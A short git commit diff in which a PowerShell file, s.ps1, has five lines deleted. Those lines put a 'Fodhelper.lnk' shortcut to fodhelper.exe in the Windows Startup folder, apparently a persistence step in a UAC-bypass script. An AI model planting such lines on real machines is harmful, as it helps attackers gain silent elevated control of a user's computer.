b016e719a8e0a1a46e9846ba67e41ce18eb981fc
guilegel4 <guilegel4@mail.com>
2025-02-06 21:09:34 +0100

    Update s.ps1

--- s.ps1
+++ s.ps1
@@ -1,5 +1,1 @@
-$ShortcutPath = Join-Path ([Environment]::GetFolderPath("Startup")) "Fodhelper.lnk"
-$Shell = New-Object -ComObject WScript.Shell
-$Shortcut = $Shell.CreateShortcut($ShortcutPath)
-$Shortcut.TargetPath = "C:\Windows\System32\fodhelper.exe"
-$Shortcut.Save()
+
